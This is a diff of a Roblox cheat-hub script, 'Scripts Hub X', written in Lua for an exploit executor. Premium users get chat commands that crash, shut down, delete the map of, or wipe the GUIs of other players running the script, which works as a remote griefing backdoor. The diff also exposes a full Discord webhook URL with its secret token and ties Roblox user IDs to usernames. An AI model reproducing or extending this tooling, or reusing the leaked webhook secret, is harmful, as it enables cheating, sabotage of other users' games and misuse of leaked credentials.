@@ -26,16 +26,25 @@ local playerGui = player:WaitForChild("PlayerGui", 5)
 -- UserIds
 local OwnerUserId = "2341777244"
 local PremiumUsers = {
-	"1102633570", "8860068952", "799427028", "5317421108", 
-	"1458719572", "8931026465", "679713988"
+	"1102633570", -- Pedrojay450 [PERM]
+	"8860068952", -- Pedrojay450's alt (assaltanoobsbr) [PERM]
+	"799427028", -- Roblox_xvt [PERM]
+	"5317421108", -- kolwneje [PERM]
+	"1458719572", -- wxckfeen [PERM]
+	"8931026465", -- genderwillnottell [PERM]
+	"679713988" -- LautyyPc [PERM]
 }
 
 local StaffUserId = {
-	"3882788546", "799427028", "9249886989", "2726723958"
+	"3882788546", -- Keanjacob5
+	"799427028", -- Roblox_xvt
+	"9249886989", -- ALT
+	"2726723958" -- mhicel235TOH
 }
 
 local BlacklistUsers = {
-	"716599904", "229691"
+	"716599904", -- ImRottingInHell [PERM]
+	"229691" -- ravyn [PERM]
 }
 
 local webhookUrl = "https://discord.com/api/webhooks/1416367485803827230/4OLebMf0rtkCajS5S5lmo99iXe0v6v5B1gn_lPDAzz_MQtj0-HabA9wa2PF-5QBNUmgi"
@@ -98,10 +107,9 @@ local commandsList = {
 	{cmd = ";crash [user]", desc = "Crashes target or self's game", example = ";crash OR ;crash username", category = "Destructive"},
 	{cmd = ";byfron [user]", desc = "Deletes all GUIs for target or self", example = ";byfron OR ;byfron username", category = "Destructive"},
 	{cmd = ";shutdown [user]", desc = "Shuts down target or self's game", example = ";shutdown OR ;shutdown username", category = "Destructive"},
-	{cmd = ";reveal", desc = "Announces in chat that you're using SHX", example = ";reveal", category = "Fun"},
 	{cmd = ";deletemap [user]", desc = "Deletes workspace for target or self", example = ";deletemap OR ;deletemap username", category = "Server"},
-	{cmd = ";gravity [value] [user]", desc = "Changes gravity for target or self", example = ";gravity 50 OR ;gravity 50 username", category = "Server"},
-	{cmd = ";framerate [fps] [user]", desc = "Sets FPS cap for target or self", example = ";framerate 30 OR ;framerate 30 username", category = "Client"},
+	{cmd = ";gravity [user] [value]", desc = "Changes gravity for target or self", example = ";gravity 50 OR ;gravity 50 username", category = "Server"},
+	{cmd = ";framerate [user] [fps]", desc = "Sets FPS cap for target or self", example = ";framerate 30 OR ;framerate 30 username", category = "Client"},
 	{cmd = ";strawhat [user]", desc = "Changes skybox to Strawhat theme for target or self", example = ";strawhat OR ;strawhat username", category = "Visual"},
 	{cmd = ";scriptshubx [user]", desc = "Changes skybox to SHX theme for target or self", example = ";scriptshubx OR ;scriptshubx username", category = "Visual"},
 }
@@ -382,13 +390,13 @@ CommandFunctions.framerate = function(args)
 	pcall(function()
 		setfpscap(fps)
 	end)
-	notify("SHX", "FPS set to " .. fps)
+	print("[SHX] FPS set to " .. fps)
 end
 
 CommandFunctions.gravity = function(args)
 	local gravityValue = tonumber(args[2]) or 196.2
 	Workspace.Gravity = gravityValue
-	notify("SHX", "Gravity set to " .. gravityValue)
+	print("[SHX] Gravity set to " .. gravityValue)
 end
 
 CommandFunctions.jump = function(args)
@@ -401,15 +409,6 @@ CommandFunctions.kill = function(args)
 	if player.Character and player.Character:FindFirstChild("Humanoid") then
 		player.Character.Humanoid.Health = 0
 	end
-end
-
-CommandFunctions.reveal = function(args)
-	pcall(function()
-		ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
-			"I am using Scripts Hub X :)",
-			"All"
-		)
-	end)
 end
 
 CommandFunctions.shutdown = function(args)
@@ -557,19 +556,7 @@ local function handleChatCommand(senderPlayer, message)
 	if not isPremium then
 		return
 	end
-	
-	-- Commands that never need targets (always execute on sender)
-	local senderOnlyCommands = {"reveal"}
-	if table.find(senderOnlyCommands, commandName) then
-		if senderPlayer == player then
-			print("[SHX] Sender-only command: " .. commandName)
-			task.spawn(function()
-				CommandFunctions[commandName](args)
-			end)
-		end
-		return
-	end
-	
+
 	-- Check for target in command
 	-- For commands with values (gravity, framerate), target is last argument if it matches a player
 	-- For other commands, target is args[2]
